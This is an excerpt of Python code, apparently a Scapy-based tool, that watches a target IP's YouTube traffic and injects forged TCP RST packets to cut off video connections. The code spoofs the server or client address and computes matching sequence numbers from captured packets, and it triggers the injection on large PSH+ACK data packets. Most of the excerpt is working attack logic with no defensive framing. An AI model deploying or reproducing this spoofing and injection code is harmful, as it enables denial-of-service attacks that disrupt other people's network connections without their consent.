...
class RSTInjector:
    ...
    def should_inject_rst(self, connection, packet):
        ...
        # Only inject for data packets with substantial payload
        if packet.haslayer(TCP):
            tcp_layer = packet[TCP]
            # Target larger packets that likely contain video data
            if len(tcp_layer.payload) > 100 and len(packet) > 800:
                # Additional check: ensure it's a data packet (not just control)
                if tcp_layer.flags & 0x18:  # PSH+ACK flags
                    return True
    ...
    def create_rst_packet(self, connection, original_packet, direction='to_client'):
        """Create TCP RST packet with correct sequence numbers"""
        ...
        try:
            # For effective RST injection, we need to understand the packet direction
            # and use appropriate sequence numbers
            
            if direction == 'to_client':
                # RST from server to client (spoof server)
                # Use the acknowledgment number from client's packet as our sequence
                rst_packet = IP(
                    src=orig_ip.dst,           # Spoof server IP (original dest)
                    dst=orig_ip.src,           # Send to client (original src)  
                    ttl=64
                ) / TCP(
                    sport=orig_tcp.dport,      # Server port (original dest port)
                    dport=orig_tcp.sport,      # Client port (original src port)
                    flags="R",                 # RST flag
                    seq=orig_tcp.ack,          # Use client's ACK as our sequence
                    ack=0,                     # RST packets don't need ACK
                    window=0                   # RST packets have zero window
                )
            else:
                # RST from client to server (spoof client)
                # Use the sequence number + payload length as our sequence
                payload_len = len(orig_tcp.payload) if orig_tcp.payload else 0
                rst_packet = IP(
                    src=orig_ip.src,           # Spoof client IP (original src)
                    dst=orig_ip.dst,           # Send to server (original dst)
                    ttl=64
                ) / TCP(
                    sport=orig_tcp.sport,      # Client port (original src port)
                    dport=orig_tcp.dport,      # Server port (original dest port)
                    flags="R",                 # RST flag
                    seq=orig_tcp.seq + payload_len,  # Current seq + data length
                    ack=0,                     # RST packets don't need ACK
                    window=0                   # RST packets have zero window
                )
...
class PacketMonitor:
    ...
    def packet_handler(self, packet):
        """Process captured packets with improved filtering"""
        self.packet_count += 1
        
        try:
            # Only process packets involving our target IP
            if not (packet[IP].src == self.target_ip or packet[IP].dst == self.target_ip):
                return
            ...
            if NetworkUtils.is_youtube_traffic(packet):
                ...
                if connection:
                    ...
                    direction = "outbound" if packet[IP].src == self.target_ip else "inbound"
                    print(f"[MONITOR] YouTube {direction}: {packet[IP].src}:{packet[TCP].sport} -> "
                          f"{packet[IP].dst}:{packet[TCP].dport} (seq={packet[TCP].seq}, "
                          f"ack={packet[TCP].ack}, size={len(packet)}, flags={packet[TCP].flags})")
                    
                    # Decide whether to inject RST
                    if self.rst_injector.should_inject_rst(connection, packet):
                        print(f"[MONITOR] Injecting RST for connection {conn_key}")
                        self.rst_injector.inject_rst_packets(connection, packet)
            
            # Print statistics periodically (reduce frequency to avoid spam)
